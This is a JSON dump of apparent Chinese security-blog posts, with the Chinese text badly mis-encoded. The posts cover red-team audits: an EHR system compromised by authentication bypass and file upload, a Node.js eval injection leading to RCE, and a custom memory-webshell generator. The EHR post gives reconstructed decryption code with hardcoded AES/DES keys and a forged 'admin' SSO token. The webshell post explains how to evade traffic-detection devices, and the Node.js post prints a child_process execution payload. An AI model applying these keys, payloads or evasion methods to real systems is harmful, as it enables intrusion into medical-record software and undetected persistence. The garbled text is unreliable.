{"posts":[{"title":"Javaå®¡è®¡ | æŸEHRç³»ç»Ÿä»Authç»•è¿‡åˆ°RCE","content":"0x00 å‡†å¤‡å·¥ä½œ æ°´ä¸€ä¸ªæ¼”ç»ƒé‡åˆ°çš„æŸä¸ªEHRç³»ç»Ÿçš„å®¡è®¡è¿‡ç¨‹ï¼Œé¦–å…ˆè·å¾—ç³»ç»Ÿçš„æ‰€æœ‰è·¯ç”±ä¿¡æ¯ æ‰¹é‡è·‘æ¥å£ï¼Œåˆ†å‡ºæ¥é‰´æƒæ¥å£å’Œæœªé‰´æƒæ¥å£ åé¢çœ‹ä»£ç ï¼Œå‘ç°å‚æ•°éƒ½åŠ å¯†äº†ï¼Œç„¶åæ‰¾åˆ°æœ‰ä¸ªåŠ å¯†çš„æ–¹æ³•ï¼Œåé¢æˆªå›¾çš„ä»£ç é»˜è®¤éƒ½è¢«æˆ‘è¿˜åŸè¿‡äº† å¦‚ä¸‹ def Kayang(s): # åˆå§‹åŒ–å­—ç¬¦æ•°ç»„ cArr = [''] * len(s) length = len(s) - 1 i = length i2 = length # åˆå§‹åŒ– c å€¼ c = ((2 ^ 5) &lt;&lt; 4) ^ (2 ^ 5) while i &gt;= 0: c2 = i2 c3 = (c2 ^ c) &amp; 0x3F # 0x3F æ˜¯ '?' çš„ ASCII å€¼ cArr[c2] = chr(ord(s[i2]) ^ c) i3 = i2 - 1 if i3 &lt; 0: break c = (i3 ^ c3) &amp; 0x3F cArr[i3] = chr(ord(s[i3]) ^ c3) i2 = i3 - 1 i = i2 # å°†å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸² return ''.join(cArr) input_str = &quot;~EyXQ_\\\u0012&quot; output_str = Kayang(input_str) print(&quot;Input:&quot;, input_str) print(&quot;Output:&quot;, output_str) 0x01 å®¡è®¡è¿‡ç¨‹ ä»»æ„æ–‡ä»¶è¯»å– é™¤å»springMvcçš„è·¯ç”±ï¼Œå†çœ‹ä¸€ä¸‹web.xmlï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç›´æ¥å®šä¹‰è·¯å¾„çš„è·¯ç”±ï¼Œçœ‹åˆ°äº†ä¸ªèµ„æºæ–‡ä»¶çš„ï¼Œè¿›å»çœ‹çœ‹ ç„¶åè¿™é‡Œå¾ˆæ˜æ˜¾æœ‰ä¸ªpathå‚æ•°æœ‰é—®é¢˜ ä¸€ä¸ª../çš„æ…¢æ…¢åŠ ä¸Šå»ï¼Œè·å¾—ä»»æ„è·¨ç›®å½•è¯»æ–‡ä»¶æ¼æ´ï¼Œè™½ç„¶å®é™…ä½œç”¨ä¸å¤§ï¼Œä¸è¿‡è¿™è¯´æ˜å…¶ä»–æ´å­˜åœ¨æ¦‚ç‡é«˜ã€‚ã€‚ ä»»æ„ç”¨æˆ·ç™»å½• åœ¨æœªé‰´æƒæ¥å£ä¸­ä¸€çœ¼æ²¡çœ‹åˆ°ä»€ä¹ˆå¤§æ¦‚ç‡ç›´æ¥getshellçš„ï¼Œæ‰€ä»¥å»çœ‹åŒ…å«ssoå­—æ ·çš„æ¥å£ï¼Œåœ¨LoginxSSOControllerç±»ä¸­å®ç°äº†LoginSSOè·¯ç”± onloadå½“å‰ç±»ä¸­æ²¡æœ‰ï¼Œå†å»å½“å‰ç±»ç»§æ‰¿çš„BaseActionç±»å»çœ‹çœ‹ æ‰¾åˆ°äº†onLoadæ–¹æ³•ï¼Œç„¶åå†è·³åˆ°onPageLoadæ–¹æ³•ï¼Œè¿™ä¸ªçˆ¶ç±»ä¸­ä¹Ÿæ²¡å®ç°ä»£ç  åˆå›åˆ°LoginxSSOControllerç±»çœ‹åˆ°äº†onPageLoadçš„å®ç°ä»£ç ï¼Œå‘ç°1ä¸ªå…³é”®å‚æ•°accountï¼Œæœ‰ä¸ªè§£å¯†æ“ä½œï¼Œç„¶ååˆ°è¾¾autoLoginæ–¹æ³•ï¼Œå¯çŸ¥å½“å‰urlä¸º/LoginxSSO.json?account=å¯†æ–‡ï¼Œæœ€ç»ˆä¼ å…¥åˆ°autoLogin(url,account,false) æ‰¾åˆ°åŠ å¯†è¿‡ç¨‹ï¼Œç›´æ¥è°ƒç”¨æˆ–è€…aiå¸®ä½ è¿˜åŸä¸ªpythonè°ƒç”¨ from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad from Crypto.Random import get_random_bytes import binascii class EncryptAndDecodeUtil: # é™æ€å˜é‡ Kayang = bytes([ 106, 105, 194, 29, 184, 80, 227, 145, 124, 35, 34, 166, 60, 126, 106, 195, 193, 187, 69, 21, 59, 62, 24, 208, 173, 142, 21, 118, 103, 95, 77, 198 ]) B = bytes([ 202, 18, 194, 223, 133, 237, 32, 62, 249, 153, 18, 24, 67, 30, 191, 234 ]) @staticmethod def encode(content: str) -&gt; str: if not content: return &quot;&quot; # ä½¿ç”¨ AES åŠ å¯† cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B) padded_data = pad(content.encode('utf-8'), AES.block_size) encrypted_data = cipher.encrypt(padded_data) return binascii.hexlify(encrypted_data).decode('utf-8') @staticmethod def decode(content: str) -&gt; str: if not content: return &quot;&quot; try: # ä½¿ç”¨ AES è§£å¯† cipher = AES.new(EncryptAndDecodeUtil.Kayang, AES.MODE_CBC, EncryptAndDecodeUtil.B) encrypted_data = binascii.unhexlify(content) decrypted_data = cipher.decrypt(encrypted_data) unpadded_data = unpad(decrypted_data, AES.block_size) return unpadded_data.decode('utf-8') except Exception as e: try: # å¦‚æœ AES è§£å¯†å¤±è´¥ï¼Œå°è¯• DES è§£å¯† return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;T_E^UYYO\\u0007&quot;) except Exception: # å¦‚æœ DES è§£å¯†å¤±è´¥ï¼Œå°è¯•ä½¿ç”¨é»˜è®¤å¯†é’¥ return EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(content), &quot;kayangv9&quot;) @staticmethod def decodeDES(data: bytes, key: str) -&gt; str: try: # ä½¿ç”¨ DES è§£å¯† from Crypto.Cipher import DES key_bytes = key.encode('utf-8') cipher = DES.new(key_bytes, DES.MODE_ECB) decrypted_data = cipher.decrypt(data) return decrypted_data.decode('utf-8').rstrip('\\0') except Exception as e: print(f&quot;Error in decodeDES: {e}&quot;) return &quot;&quot; @staticmethod def encodeDES(content: str, key: str) -&gt; str: if not content: return &quot;&quot; try: # ä½¿ç”¨ DES åŠ å¯† from Crypto.Cipher import DES key_bytes = key.encode('utf-8') cipher = DES.new(key_bytes, DES.MODE_ECB) padded_data = pad(content.encode('utf-8'), DES.block_size) encrypted_data = cipher.encrypt(padded_data) return binascii.hexlify(encrypted_data).decode('utf-8') except Exception as e: print(f&quot;Error in encodeDES: {e}&quot;) return &quot;&quot; # æµ‹è¯•ä»£ç  if __name__ == &quot;__main__&quot;: # æµ‹è¯• encode å’Œ decode encod_text = &quot;ttt&quot; encoded_text = EncryptAndDecodeUtil.encode(encod_text) print(f&quot;Encoded: {encoded_text}&quot;) decode_text = &quot;fa32fda300eeb85fc0e3116ec9a0f191&quot; decoded_text = EncryptAndDecodeUtil.decode(decode_text) print(f&quot;Decoded: {decoded_text}&quot;) # æµ‹è¯• encodeDES å’Œ decodeDES original_text = &quot;Hello, DES!&quot; encoded_text = EncryptAndDecodeUtil.encodeDES(original_text, &quot;kayangv9&quot;) print(f&quot;Encoded DES: {encoded_text}&quot;) decoded_text = EncryptAndDecodeUtil.decodeDES(binascii.unhexlify(encoded_text), &quot;kayangv9&quot;) print(f&quot;Decoded DES: {decoded_text}&quot;) éšä¾¿åŠ å¯†ä¸ªtttè·å¾—ç»“æœ2972707ed0733287402a099e76285e7a è¯·æ±‚åæç¤ºè´¦å·ä¸å­˜åœ¨ï¼Œæœ‰ç‚¹ä¸œè¥¿å“ˆ ç”Ÿæˆadminè´¦å·çš„ï¼Œfa32fda300eeb85fc0e3116ec9a0f191ï¼Œå‘ç°è·³302 æ‰¾ä¸ªå…¶ä»–é‰´æƒæ¥å£ï¼Œæµ‹è¯•ä¸‹cookieï¼Œå‘ç°æœ‰æ•ˆï¼Œè¿™å¾ˆå¥½ï¼Œåç¼€aspxå¯ä»¥å¿½ç•¥å“ˆï¼Œéšä¾¿é€‰çš„åç¼€ï¼Œæ˜¯web.xmlè®¾ç½®çš„èµ°spingmvcè®¤è¯çš„å‡ ä¸ªåç¼€ä¹‹ä¸€ï¼Œå¯èƒ½æ˜¯ä¸ºäº†è®©åˆ«äººè¯¯åˆ¤åç«¯è¯­è¨€å§ æ²¡è¿‡é‰´æƒæ˜¯å›æ˜¾è¿™ä¸ªçš„ ä»»æ„æ–‡ä»¶ä¸Šä¼  æ‰¾åˆ°è¿™ä¸ªæ´çš„å¤§æ¦‚è¿‡ç¨‹ï¼Œåœ¨burpçš„apiè®¿é—®è®°å½•ä¸­ä»ä¸Šåˆ°ä¸‹çœ‹äº†ä¸€äº›è·¯å¾„å¯èƒ½åŒ…å«ä¸Šä¼ åŠŸèƒ½çš„apiï¼Œä½†æ²¡æœ‰æ‰¾åˆ°èƒ½ç”¨çš„ï¼Œä¸€äº›åŸå› å¦‚ä¸‹ 1.å†™æ­»äº†åç¼€ 2.è¿˜æœ‰çš„æ˜¯æ£€æµ‹æ—¶é»‘åå•ï¼Œä½†ä½¿ç”¨å…¶ä»–åç¼€åå•ä¼šå¯¼è‡´å‡½æ•°ä¸è¿”å›trueï¼Œå¯¼è‡´å‡½æ•°ä¸å¾€ä¸‹èµ° 3.æœ‰ä¸€äº›ä¼šåœ¨è°ƒç”¨æ–‡ä»¶ä¸Šä¼ å‰å­˜åœ¨ä¸€äº›å‰ç½®æ“ä½œï¼Œå¯¼è‡´æ–¹æ³•åœæ­¢è¿è¡Œ åç»­å¼€å§‹å…¨å±€æœç´¢fileOutputStream.writeï¼Œå»çœ‹çœ‹å¯¹åº”çš„æ–‡ä»¶ï¼Œæ²¡æ‰¾åˆ° åˆæœFileUtils.copyFile( ï¼Œæ‰¾åˆ°ä¸€ä¸ªsaveAsæ–¹æ³• é€šè¿‡å¯¹saveAsæ–¹æ³•çš„è°ƒç”¨ï¼Œå®šä½åˆ°äº†æœ¬æ¬¡çš„æ¥å£ï¼Œä»£ç å¦‚ä¸‹ï¼Œåˆšå¥½åœ¨æ£€æµ‹åç¼€å‰ä»–è°ƒç”¨äº†å†…ç½®ä¸Šä¼ æ–¹æ³•ï¼Œè¿½æº¯ä¸Šå»å‘ç°åç¼€æ­£å¥½æ˜¯ä¼ å…¥çš„srcnameå‚æ•°æ§åˆ¶ï¼Œè¿™æ ·è™½ç„¶æ— æ³•å®Œå…¨è¿è¡Œå®Œæ¯•ï¼Œä½†è¿˜æ˜¯å®Œæˆäº†ä¸Šä¼ æ­¥éª¤ åŒæ—¶ç¼“å­˜æ–‡ä»¶çš„uuidè¿˜ä¼šåœ¨å¼‚å¸¸ä¿¡æ¯ä¸­è¿”å› å®Œæˆé—­ç¯ 0x02 ç»“æŸ æ°´æ–‡ç»“æŸï¼Œä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™æ‰èƒ½å†æ¬¡ç¢°åˆ°èµ„äº§ç”¨ä¸Šæ´ ","link":"https://www.svenbeast.com/post/7iSXkstGK7/"},{"title":"ä¸ä¸Šçº¿ä½ æ˜¯è¿™ä¸ªğŸ‘","content":" ","link":"https://www.svenbeast.com/post/E0Bcu3tVli/"},{"title":"Javaå·¥å…· | JMGæ·»åŠ è‡ªå®šä¹‰å†…å­˜é©¬","content":"0x01 åŸå›  â€‹ å› ä¸ºå“¥æ–¯æ‹‰é»˜è®¤ç‰ˆæœ¬è§¦å‘æµé‡è®¾å¤‡å‘Šè­¦çš„å‡ ç‡è¾ƒé«˜ï¼Œæ‰€ä»¥å¤§éƒ¨åˆ†åœºæ™¯éƒ½æ˜¯ä½¿ç”¨äºŒå¼€è¿‡çš„å“¥æ–¯æ‹‰åŠshellè¿›è¡Œç®¡ç†webshellï¼Œä¸è¿‡åœ¨ä¸€äº›javaå†…å­˜é©¬æ³¨å…¥çš„æ¼æ´ä¸Šé¢ä½¿ç”¨jmgç”Ÿæˆå†…å­˜é©¬æ—¶è¿˜æ˜¯ä¼šéœ€è¦å…ˆä½¿ç”¨é»˜è®¤ç‰ˆæœ¬å“¥æ–¯æ‹‰shellå†æ³¨å…¥äºŒå¼€ç‰ˆæœ¬çš„å“¥æ–¯æ‹‰shellï¼Œå¢åŠ å‘Šè­¦é£é™©ï¼Œæ‰€ä»¥å¾—æŠŠè‡ªå·±çš„shellåŠ åˆ°jmgé‡Œç›´æ¥ç”Ÿæˆã€‚ 0x02 æ·»åŠ JMGç”Ÿæˆshellé€‰é¡¹ 1.jmg-guiæ¨¡å— æ·»åŠ Filter_ImageæŒ‰é’® æ·»åŠ ç»“æœè¾“å‡º 2.jmg-coreæ¨¡å— æ·»åŠ Shellç±»å‹ï¼Œèµ·åSHELL_FILTER_IMAGE æ·»åŠ ç”Ÿæˆé€»è¾‘ æ·»åŠ ç”Ÿæˆé€»è¾‘ 3.jmg-godzilla æ·»åŠ æŒ‡å‘shellç±»çš„ä»£ç  æ–°å»ºä¸ªå†…å­˜é©¬ç±»ï¼Œç±»åå’Œå‰é¢åŠ çš„å¯¹åº”ä¸Šï¼Œè½¬æ¢ä½ ç”¨æ¥bypassæµé‡è®¾å¤‡çš„jspä»£ç ä¸ºFilterç±»å‹çš„javaä»£ç ï¼Œæˆ‘è¿™é‡Œè‚¯å®šæ˜¯å“¥æ–¯æ‹‰ç±»å‹çš„shellå’¯ï¼ŒåŠ å¯†æ–¹æ³•å’Œè§£å¯†æ–¹æ³•ç…§æ¬ï¼Œå…¶ä»–ä¹Ÿéƒ½æ˜¯ç…§æ¬è¿‡æ¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯æˆ‘è¿™é‡Œå½“å±æ€§ä¸ºnullæ—¶ï¼ŒsetAttributeå±æ€§çš„ä»£ç ç”¨åŸæœ¬çš„å³å¯ 0x03 æ·»åŠ å®Œæˆ æœ€ç»ˆæ•ˆæœï¼Œå¸®åŠ©ä½ å†…å­˜é©¬åœºæ™¯ä¸‹é˜²æ­¢ä½¿ç”¨æ™®é€šå“¥æ–¯æ‹‰shellè§¦å‘æµé‡æ£€æµ‹è®¾å¤‡çš„å‘Šè­¦ ","link":"https://www.svenbeast.com/post/HDu5nl4VC/"},{"title":"Nodejså®¡è®¡ | æŸæ¼”ç»ƒå…¥å£ç‚¹çš„äºŒæ¬¡æ³¨å…¥RCE","content":"0x01 èƒŒæ™¯ â€‹ ä¹‹å‰ä¸¾è¡Œè¿‡çš„äº‘èµ„äº§çš„æ¼”ç»ƒåˆå¼€å§‹äº†ï¼Œç›®å‰æ‹¥æœ‰ç›®æ ‡æŸè®¾å¤‡çš„è€ç‰ˆæœ¬å‰å°RCEæ¼æ´ï¼Œä½†æœ¬æ¬¡å› æŸäº›åŸå› ä¸å…è®¸ä½¿ç”¨æ­¤æ¼æ´ï¼Œæ‰€ä»¥å…¥å£ç‚¹éœ€è¦é‡æ–°æ‰¾ï¼Œå‡†å¤‡æ‰¾ä¸ªæ–°æ´ï¼Œè®°å½•nodejså®¡è®¡è¿‡ç¨‹å¦‚ä¸‹ 0x02 å®¡è®¡ 1.å‰æœŸè¿‡ç¨‹ â€‹ é¦–å…ˆæˆ‘çš„æƒ³æ³•æ˜¯å¯»æ‰¾é‚£ç§ç®€å•çš„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå› ä¸ºä¹‹å‰çš„æ´å°±è›®ç®€å•çš„ï¼Œæˆ‘åšäº†å¦‚ä¸‹æ“ä½œï¼Œç›®çš„æ˜¯å®šä½è°ƒç”¨äº†å‘½ä»¤æ‰§è¡Œå‡½æ•°çš„è·¯ç”±æ–‡ä»¶ grep -rl &quot;child_process&quot; --include=\\*.js . â€‹ ç„¶åé¦–å…ˆçœ‹çš„æ˜¯pingåŠŸèƒ½ï¼Œå¾ˆç®€å•çš„å®šä¹‰è·¯ç”±ï¼Œæ¥å‚ï¼Œç„¶åä¼ å…¥å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­ï¼Œä½†å‘ç°å­˜åœ¨æ­£åˆ™è¿‡æ»¤ï¼Œç”±äºæ­£åˆ™æˆ‘éƒ½æ˜¯ç°è®°ç°å¿˜ï¼Œé‡æ–°çœ‹äº†ä¸‹ï¼Œå†™æ­»äº†\\dé™åˆ¶äº†å…¶ä»–å­—ç¬¦ï¼Œæ‰€ä»¥æ¼æ´ä¸å­˜åœ¨ â€‹ æ¥ç€è¿‡äº†ä¸€éç­›é€‰å‡ºæ¥çš„æ‰€æœ‰å­˜åœ¨å‘½ä»¤æ³¨å…¥å‡½æ•°çš„è·¯ç”±ï¼Œæ²¡å‘ç°èƒ½ç”¨çš„ï¼Œæœ‰çš„çœ‹ç€ä»£ç æ˜¯å­˜åœ¨æ¼æ´ä½†æ˜¯å½“ç”¨åœ¨ç›®æ ‡ç½‘ç«™ä¸Šæ˜¯ä¸å­˜åœ¨æ¼æ´çš„ï¼Œæ¨æµ‹æ˜¯ç›®æ ‡æ›´æ–°äº†ç‰ˆæœ¬è¿›è¡Œä¿®å¤æ¼æ´ï¼ˆè¿™é‡Œè¿˜æ²¡æœ‰å»è·Ÿè¸ªå„ä¸ªå‡½æ•°è°ƒç”¨é“¾æ·±æŒ–ï¼‰ â€‹ éšå³åˆæœäº†ä¸‹nodejsçš„æ–‡ç« çŸ¥é“äº†è¿˜å¯ä»¥å¯»æ‰¾ä»£ç æ‰§è¡Œæ¼æ´ï¼Œä¹Ÿå°±æ˜¯evalå‡½æ•°ï¼Œevalå‚æ•°å¯æ§æ—¶ç›´æ¥è¿›è¡Œå¯¼å…¥å‘½ä»¤æ‰§è¡Œè¿›è¡Œè°ƒç”¨å°±è¡Œ http://localhost:3000/?abc=require('child_process').execSync('open -a Calculator.app', { encoding: 'utf8' }) â€‹ grepå¤§æ³•ä¹‹æ•…æŠ€é‡æ–½ï¼Œå®é™…å°±æœ‰2ä¸ªrouteæ–‡ä»¶å­˜åœ¨evalï¼Œå½“ç„¶åˆ«çš„æ–‡ä»¶ä¹Ÿæ˜¯è€—è´¹ç²¾åŠ›çœ‹äº†ä½†æ²¡ä¸œè¥¿ï¼Œå°±ä¸è®²äº†ï¼Œåç»­åœ¨åæ¨evalå‡½æ•°ä»£ç æ‰§è¡Œçš„è°ƒç”¨é“¾ä¸­åŒæ—¶æ‰¾åˆ°ä¸€ä¸ªå‘½ä»¤æ³¨å…¥æ¼æ´ grep -rl &quot;eval&quot; --include=\\*.js . 2.ä»£ç æ‰§è¡Œ â€‹ ç„¶åå°±æ˜¯å‘ç°çš„æ¼æ´ä»evalå‡½æ•°åæ¨è°ƒç”¨é“¾è·¯åŠä¼ å‚çš„ä¼¤è„‘ç»†èƒè¿‡ç¨‹ï¼Œè°ƒç”¨é“¾ä¸­è¾ƒä¸ºé‡è¦çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹ï¼Œå‡½æ•°é‡ŒåµŒå¥—çš„å…¶ä»–ä¸€äº›å‡½æ•°å°±ä¸å†™äº† +-----------------------------------------------------------------+ | router.post('/generatorRuleMap', function (req, res) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | execGetNostructureNodeAndLinks(NodeSet, startTime, ... , cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getRelationNodeandLinks(resultSet, relationMap, ... , cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getNodevalueBynodeType(row, nodeType, regex, index, cb) | +-----------------------------------------------------------------+ | V +-----------------------------------------------------------------+ | getRegexPattern(srcMessage, pattern, index) | +-----------------------------------------------------------------+ 2.1 getRegexPattern() â€‹ æ­¤ä¸ºæœ€ç»ˆè°ƒç”¨evalçš„å‡½æ•°ï¼Œæ²¡æœ‰é™åˆ¶ï¼Œç›´æ¥å°†æ¥æ”¶çš„å‚æ•°ä¼ å…¥evalå‡½æ•°ï¼Œpayloadå‚æ•°åä¸ºpattern 2.2 getNodevalueBynodeType() â€‹ æ­¤å‡½æ•°ä¸ºå½“nodeType!=1æ—¶è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸ºregex 2.3 getRelationNodeandLinks() â€‹ æ­¤å‡½æ•°éœ€è¦ä½¿relationMap!=1è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸ºrelationMap.srcRegexï¼Œæ˜¯é”®çš„å€¼ 2.4 execGetNostructureNodeAndLinks() â€‹ æ­¤å‡½æ•°éœ€è¦æ»¡è¶³3ä¸ªæ¡ä»¶è¿›å…¥ç›®æ ‡å‡½æ•°ï¼Œpayloadå‚æ•°åä¸ºrelationShips =&gt; relation outPutFieldsArray.length &gt; 1 å­˜åœ¨/usr/local/las/program/neo4j/structure.csvæ–‡ä»¶ fileSize != 0 2.5 router.post â€‹ æ­¤å‡½æ•°éœ€è¦æ»¡è¶³5ä¸ªæ¡ä»¶æ‰èƒ½è¿›å…¥ç›®æ ‡å‡½æ•° èƒ½å¤Ÿæ ¹æ®_idæŸ¥å‡ºç»“æœdocs docrelation == 0 æœåŠ¡å™¨ä¸ºlinux indexArray.length &gt; 0 è·å¾—ç›¸åº”çš„splitrelationsBystructure()å‡½æ•°è¿”å› payloadå‚æ•°åä¾æ¬¡å˜åŒ–å¦‚ä¸‹ï¼Œå¹¶ä¸”å¯çŸ¥æˆ‘ä»¬æ§åˆ¶çš„å‚æ•°æ˜¯ç”¨æ¥æ§åˆ¶æŸ¥è¯¢çš„idï¼Œè€Œä¸æ˜¯ç›´æ¥ä¼ å…¥expï¼Œæ‰€ä»¥è¿˜éœ€è¦æ‰¾åˆ°idå¯¹åº”çš„å€¼æ˜¯æ’å…¥åˆ°æ•°æ®åº“çš„è¿‡ç¨‹ req.body._id //è·å¾—è¯·æ±‚å‚æ•° â†“ s_id //å¯¹è¯·æ±‚å‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œé˜²æ­¢å‡ºç°sqlæ³¨å…¥ â†“ docs.relationships //æŸ¥è¯¢ç»“æœçš„é”® â†“ relations //æŸ¥è¯¢ç»“æœçš„é”® â†“ resultRelation.noStructure //ç»splitrelationsBystructureå‡½æ•°å¤„ç†åè¿”å›çš„é”® â†“ noStructureRelations //ç»splitrelationsBystructureå‡½æ•°å¤„ç†åè¿”å›çš„é”® 2.5.1 splitrelationsBystructure() â€‹ payloadå‚æ•°ä¸ºrelationShipsï¼Œè‹¥è¦å°†payloadæœ€ç»ˆä¿å­˜åˆ°noStructureé”®ä¸­ï¼Œéœ€æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ srcNodeType != 1 or dstNodeType != 1 â€‹ å¹¶ä¸”é€šè¿‡è¿™é‡Œçš„é”®è°ƒç”¨ï¼Œè”åŠ¨å‰é¢çš„payloadä¼ é€’è¿‡ç¨‹ï¼Œä¹Ÿå¾—çŸ¥äº†æœ€ç»ˆä¼ å…¥evalçš„å‚æ•°ä¸ºsrcRegexï¼Œå¦‚æœåœ¨ä¸‹é¢è¿™ä¸ªå‡½æ•°ä¸­è°ƒç”¨ï¼Œå°±æ˜¯relation.srcRegexï¼Œå’ŒsrcNodeTypeè¿™äº›æ˜¯åŒçº§çš„ï¼Œæ‰€ä»¥srcRegexå’ŒsrcNodeTypeè¿™äº›éƒ½æ˜¯æ’å…¥idå¯¹åº”çš„å†…å®¹ä¸­çš„é”®å 2.5.2 é€šè¿‡å‰ç«¯å®šä½æ·»åŠ å…³ç³»è§„åˆ™åŠŸèƒ½ â€‹ ç”±äºéœ€è¦æ‰¾åˆ°å¦‚ä½•æ§åˆ¶idæŸ¥è¯¢ç»“æœï¼Œæ‰€ä»¥åœ¨ç½‘ç«™ä¸Šæ‰¾åˆ°ä»£ç ä¸­å¯¹åº”çš„å‰ç«¯åŠŸèƒ½ä½ç½®ï¼Œæ­¤åŠŸèƒ½æ˜¯ç”Ÿæˆå…³ç³»è§„åˆ™å›¾ï¼Œç„¶ååœ¨å‰ç«¯æ‰¾åˆ°äº†å¯¹åº”çš„æ·»åŠ å…³ç³»è§„åˆ™çš„åŠŸèƒ½ï¼Œç”±äºæ²¡ä¿å­˜å…·ä½“å›¾ç‰‡ï¼Œå£è¿°è®°å½•ä¸€ä¸‹è¿‡ç¨‹ â€‹ ç„¶ååœ¨å°è¯•æ–°å¢å…³ç³»æ¨¡å‹æ—¶ï¼Œå‘ç°æäº¤å¯¹åº”çš„å‚æ•°è¾“å…¥æ¡†è¢«æ³¨é‡Šäº†ï¼Œå½“æ—¶æ¢³ç†çš„è¿˜æ²¡æœ‰é‚£ä¹ˆæ¸…æ™°è¿˜æ˜¯ä»€ä¹ˆå…¶ä»–åŸå› å¯¼è‡´æ²¡åœ¨httpä¸­æ”¹åŒ…ï¼Œæ˜¯ä½¿ç”¨burpå°†è¿”å›&lt;!--æ³¨é‡Šç¬¦å·æ³¨é‡Šå’Œå…¶ä»–çš„ä¸€äº›è¿”å›åŒ…ä¿®æ”¹ï¼Œè®©æ–°å¢å…³ç³»æ¨¡å‹çš„åŠŸèƒ½é‡æ–°åœ¨å‰ç«¯æ˜¾ç¤º â€‹ è·å–åˆ°æ·»åŠ å…³ç³»æ¨¡å‹çš„è·¯ç”±å’Œæ•°æ®åŒ…åï¼Œå®šä½åˆ°ä»£ç ï¼Œç¡®å®šæ— è¯¯ï¼Œå‚æ•°åéƒ½èƒ½å¯¹ä¸Šï¼Œæœ€åæ„é€ èƒ½å¤Ÿæ»¡è¶³ä»¥ä¸Šéœ€è¦æ­¥å…¥çš„ç›®æ ‡å‡½æ•°çš„æ‰€æœ‰æ¡ä»¶çš„å‚æ•°å€¼ 2.6 æ¼æ´åˆ©ç”¨ æœ€ç»ˆåˆ©ç”¨è¿‡ç¨‹åˆ†ä¸ºå››æ­¥ 1.æ·»åŠ å…³ç³»è§„åˆ™ 2.æŸ¥è¯¢å…³ç³»è§„åˆ™ï¼Œè·å¾—ID 3.è°ƒç”¨IDï¼Œè§¦å‘payload 4.åˆ é™¤å…³ç³»è§„åˆ™ï¼Œå¦åˆ™ä¼šåœ¨æ•°æ®åº“ä¸­ç•™ä¸‹å¾ˆå¤šæ•°æ® 5.ç›®æ ‡ä¸å‡ºç½‘é€šè¿‡å†™å…¥æ–‡ä»¶æ‰§è¡Œå‘½ä»¤ç»“æœè¿›è¡Œå‘½ä»¤å›æ˜¾ 3.å‘½ä»¤æ‰§è¡Œ 3.1 generateToCsv() â€‹ å‘½ä»¤æ‰§è¡Œæ˜¯åœ¨æ‰¾ä»£ç æ‰§è¡Œè·Ÿè¸ªè°ƒç”¨é“¾æ—¶å‘ç°çš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯åœ¨ä»£ç æ‰§è¡Œè°ƒç”¨é“¾é‚£ä¸ªexecGetNostructureNodeAndLinkså‡½æ•°ä¸­è°ƒç”¨çš„ â€‹ ä¼ å…¥åˆ°è¿™é‡Œçš„å‚æ•°è·Ÿè¸ªåä¼šå‘ç°æ˜¯å’Œä»£ç æ‰§è¡Œä¸­ä¼ å…¥çš„payloadæ˜¯å·®ä¸å¤šçš„ï¼Œé€šè¿‡å®¡è®¡å‘ç°åªæ˜¯ä¼ å…¥çš„å‚æ•°åæ”¹ä¸ºäº†srcLogfieldï¼Œåˆ©ç”¨è¿‡ç¨‹å°±ä¸å†™äº†ï¼Œå°±æ˜¯æ·»åŠ å…³ç³»æ—¶payloadæ”¹ä¸‹å‚æ•° 0x03 æ€»ç»“ â€‹ æ•´ä½“å°±æ˜¯ç±»ä¼¼äºsqlçš„äºŒæ¬¡æ³¨å…¥çš„ä»£ç æ‰§è¡Œ&amp;å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œå…ˆä¿å­˜payloadåˆ°æ•°æ®åº“ï¼Œåœ¨åé¢è°ƒç”¨æ•°æ®åº“æ•°æ®æ—¶è§¦å‘æ¶æ„ä»£ç ã€‚ â€‹ çœ‹æ–‡ç« è¯´nodejsçš„ä»£ç è¿˜å¯ä»¥å°è¯•æ‰¾åŸå‹é“¾æ±¡æŸ“è¿›è¡ŒRCEï¼Œä»¥åæœ‰éœ€è¦å†å­¦ï¼Œæœ€ååæ§½ä¸‹å…¬å¸ç»™æˆ‘ä»¬è°ƒè–ªäº†ï¼Œé«˜å…´å§ï¼Ÿæ˜¯å¾€ä¸‹è°ƒï¼å…¥èŒå‡ å¹´ï¼Œå¹´æ”¶å…¥æ¯”å…¥èŒæ—¶è¿˜ä½äº†ï¼Œè¿˜ä½äº†ï¼ŒæŠµäº†ï¼Œäº†...ğŸ¤¡ â€‹ å®é™…å®¡è®¡è¿‡ç¨‹è¿˜æœ‰å…¶ä»–ä¸€äº›ä¸œè¥¿ï¼Œå¤§æ¦‚å¦‚ä¸‹ æ‹¿åˆ°æƒé™å‘ç°æ˜¯ä½æƒé™ç”¨æˆ·ï¼Œé€šè¿‡å…¶ä»–å‘ç°å¯åˆ©ç”¨æ¼æ´ç›´æ¥å˜æˆrootæƒé™ è¯·æ±‚å¿…é¡»æºå¸¦å¯¹åº”ç›®æ ‡hostçš„Referer è®°ä¸æ¸…äº†ã€‚ã€‚ ","link":"https://www.svenbeast.com/post/b_Y7hJQKj/"},{"title":"Javaç‚¹æ»´ | interface&implements","content":"0x01 Hello~ï¼ˆinterface&amp;implementsï¼‰ â€‹ 